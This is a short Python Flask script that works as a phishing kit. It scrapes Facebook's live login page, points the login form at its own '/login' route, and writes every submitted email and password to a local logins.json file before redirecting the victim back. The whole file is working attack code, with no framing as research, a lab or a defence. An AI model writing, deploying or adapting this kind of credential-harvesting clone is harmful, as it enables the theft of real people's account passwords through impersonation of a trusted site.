from flask import Flask, render_template, request, redirect
from bs4 import BeautifulSoup
import requests, json

app = Flask(__name__)

@app.route("/", methods=["get"])
def main():
    response = requests.get("https://www.facebook.com")
    soup = BeautifulSoup(response.text, "html.parser")
    form = soup.find("form", { "data-testid": "royal_login_form" })

    form["action"] = "/login"
    form["method"] = "get"

    with open("./templates/index.html", "w", encoding="utf-8") as file:
        file.write(soup.prettify())

    return render_template("index.html")

@app.route("/login")
def login():
    username = request.args.get("email")
    password = request.args.get("pass")

    with open("./logins.json", "r", encoding="utf-8") as file:
        jsons = json.loads(file.read())
        new_data = {
            "username": str(username),
            "password": str(password)
        }

        jsons.append(new_data)
        with open("./logins.json", "w", encoding="utf-8") as file:
            file.write(json.dumps(jsons, indent=4))

    return redirect("/")


if __name__ == "__main__":
    app.run(host="0.0.0.0")